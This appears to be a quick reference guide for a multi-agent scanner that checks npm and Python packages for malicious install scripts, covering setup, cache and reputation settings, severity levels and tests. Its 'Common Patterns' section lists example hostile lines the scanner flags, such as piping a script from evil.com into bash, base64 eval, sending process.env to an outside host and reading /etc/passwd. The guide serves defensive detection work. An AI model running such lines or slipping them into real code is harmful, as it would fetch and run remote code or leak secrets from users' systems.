# Quick Reference Guide

Fast reference for common tasks and configurations.

## Installation

```bash
# Clone and setup
git clone <repository-url>
cd multi-agent-security
python setup_venv.py
source venv/bin/activate  # Windows: venv\Scripts\activate

# Configure
cp .env .env.local
# Edit .env.local with your OPENAI_API_KEY
```

## Basic Commands

```bash
# Analyze GitHub repo
python main_github.py --repo https://github.com/owner/repo

# Analyze local project
python main_github.py --local /path/to/project

# Start web interface
python app.py
# Open http://localhost:5000

# Run tests
pytest
pytest -k "property"  # Property-based tests only
```

## Supported File Types

| Ecosystem | Files | Auto-Detected |
|-----------|-------|---------------|
| npm | package.json | ✅ |
| Python | setup.py, requirements.txt, pyproject.toml | ✅ |
| Java | pom.xml | ❌ (extensible) |

## Configuration Quick Reference

### Essential Settings (.env)

```bash
# Required
OPENAI_API_KEY=sk-...

# Optional
GITHUB_TOKEN=ghp_...
CACHE_ENABLED=true
REPUTATION_ENABLED=true
```

### Cache Settings

```bash
CACHE_BACKEND=sqlite          # sqlite, redis, memory
CACHE_DB_PATH=.cache/analysis_cache.db
CACHE_LLM_TTL_HOURS=168      # 1 week
CACHE_REPUTATION_TTL_HOURS=24
CACHE_MAX_SIZE_MB=500
```

### Reputation Settings

```bash
REPUTATION_ENABLED=true
REPUTATION_THRESHOLD=0.3      # Flag packages below this
REPUTATION_RATE_LIMIT=10      # Requests per second
REPUTATION_TIMEOUT=5          # Seconds
```

## Python API Quick Reference

### Cache Manager

```python
from tools.cache_manager import CacheManager

cache = CacheManager(backend="sqlite", ttl_hours=168)

# Get/store LLM results
result = cache.get_llm_analysis(script_hash)
cache.store_llm_analysis(script_hash, result)

# Get statistics
stats = cache.get_stats()
print(f"Hit rate: {stats['hit_rate']:.1%}")

# Cleanup
cache.cleanup_expired()
cache.clear()
```

### Reputation Scorer

```python
from tools.reputation_service import ReputationScorer
from tools.ecosystem_analyzer import registry

scorer = ReputationScorer(registry)

# Calculate reputation
rep = scorer.calculate_reputation("package-name", "npm")
print(f"Score: {rep['score']:.2f}")
print(f"Flags: {rep['flags']}")

# Check if suspicious
if rep['score'] < 0.3:
    print("⚠️ Low reputation package!")
```

### Ecosystem Analyzers

```python
from tools.ecosystem_analyzer import registry
from tools.npm_analyzer import NpmAnalyzer
from tools.python_analyzer import PythonAnalyzer

# Get analyzer for ecosystem
analyzer = registry.get_analyzer("npm")

# Auto-detect ecosystem
ecosystem = registry.detect_ecosystem("/path/to/project")

# Analyze project
findings = analyzer.analyze_install_scripts("/path/to/project")
deps = analyzer.extract_dependencies("/path/to/manifest")
```

## Severity Levels

| Level | Description | Action |
|-------|-------------|--------|
| 🔴 CRITICAL | Remote code execution, data theft | Block immediately |
| 🟠 HIGH | Obfuscated code, suspicious patterns | Review carefully |
| 🟡 MEDIUM | Low reputation, typosquatting | Investigate |
| 🔵 LOW | Outdated dependencies, warnings | Monitor |
| ✅ INFO | No issues found | Proceed |

## Reputation Score Interpretation

| Score | Risk Level | Meaning |
|-------|-----------|---------|
| 0.0-0.3 | 🔴 High | New/unknown package, flag as finding |
| 0.3-0.6 | 🟡 Medium | Limited adoption, warn user |
| 0.6-0.8 | 🟢 Low | Established package, note only |
| 0.8-1.0 | ✅ Trusted | Popular, well-maintained |

## Common Patterns

### Malicious Patterns (Critical)

**npm/JavaScript:**
```javascript
curl http://evil.com/malware.sh | bash
eval(Buffer.from('base64', 'base64').toString())
```

**Python:**
```python
os.system("curl http://evil.com/steal.py | bash")
exec(base64.b64decode('base64string'))
```

### Suspicious Patterns (High)

**npm:**
```javascript
require('child_process').exec('wget ...')
fetch('http://suspicious.tk/collect?data=' + process.env)
```

**Python:**
```python
subprocess.call(["wget", "http://evil.com"], shell=True)
open('/etc/passwd', 'r').read()
```

## Troubleshooting Quick Fixes

### Cache Issues

```bash
# Clear cache
python -c "from tools.cache_manager import CacheManager; CacheManager().clear()"

# Check cache stats
python -c "from tools.cache_manager import CacheManager; print(CacheManager().get_stats())"
```

### API Issues

```bash
# Verify API key
python -c "import os; from dotenv import load_dotenv; load_dotenv(); print('Key set:', bool(os.getenv('OPENAI_API_KEY')))"

# Test API connection
curl https://api.openai.com/v1/models \
  -H "Authorization: Bearer $OPENAI_API_KEY"
```

### Performance Issues

```bash
# Enable caching
echo "CACHE_ENABLED=true" >> .env

# Use Redis for better performance
pip install redis
echo "CACHE_BACKEND=redis" >> .env
redis-server
```

## File Locations

```
multi-agent-security/
├── .env                    # Configuration
├── .cache/                 # Cache database
│   └── analysis_cache.db
├── outputs/                # Analysis results
├── tools/                  # Core modules
│   ├── cache_manager.py
│   ├── reputation_service.py
│   ├── ecosystem_analyzer.py
│   ├── npm_analyzer.py
│   └── python_analyzer.py
├── main_github.py          # CLI entry point
├── app.py                  # Web interface
└── requirements.txt        # Dependencies
```

## Testing Quick Reference

```bash
# Run all tests
pytest

# Run specific test file
pytest test_cache_manager.py

# Run property-based tests
pytest -k "property"

# Run with coverage
pytest --cov=tools --cov-report=html

# Run specific test
pytest test_cache_manager.py::test_cache_hit

# Verbose output
pytest -v

# Stop on first failure
pytest -x
```

## Web Interface Quick Reference

### Upload Files

1. Start: `python app.py`
2. Open: `http://localhost:5000`
3. Upload: package.json, requirements.txt, or setup.py
4. View: Real-time analysis with findings and reputation scores

### API Endpoints

```bash
# Analyze file
curl -X POST http://localhost:5000/analyze \
  -F "file=@package.json"

# Health check
curl http://localhost:5000/health
```

## Environment Variables Reference

| Variable | Default | Description |
|----------|---------|-------------|
| `OPENAI_API_KEY` | - | OpenAI API key (required) |
| `GITHUB_TOKEN` | - | GitHub API token (optional) |
| `CACHE_ENABLED` | true | Enable caching |
| `CACHE_BACKEND` | sqlite | Cache backend (sqlite/redis/memory) |
| `CACHE_LLM_TTL_HOURS` | 168 | LLM cache TTL (1 week) |
| `CACHE_REPUTATION_TTL_HOURS` | 24 | Reputation cache TTL |
| `CACHE_MAX_SIZE_MB` | 500 | Maximum cache size |
| `REPUTATION_ENABLED` | true | Enable reputation scoring |
| `REPUTATION_THRESHOLD` | 0.3 | Low reputation threshold |
| `AGENT_TEMPERATURE` | 0.1 | LLM temperature |
| `AGENT_MAX_TOKENS` | 4096 | Max tokens per response |
| `AGENT_TIMEOUT_SECONDS` | 120 | Agent timeout |

## Links

- [README.md](README.md) - Full documentation
- [EXAMPLES.md](EXAMPLES.md) - Usage examples
- [TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Detailed troubleshooting
- [tools/cache_manager_usage.md](tools/cache_manager_usage.md) - Cache guide
- [WEBAPP_QUICKSTART.md](WEBAPP_QUICKSTART.md) - Web interface guide

## Getting Help

1. Check [TROUBLESHOOTING.md](TROUBLESHOOTING.md)
2. Run diagnostics: `python .kiro/diagnose.py`
3. Enable debug logging: `export LOG_LEVEL=DEBUG`
4. Open an issue with error details and system info
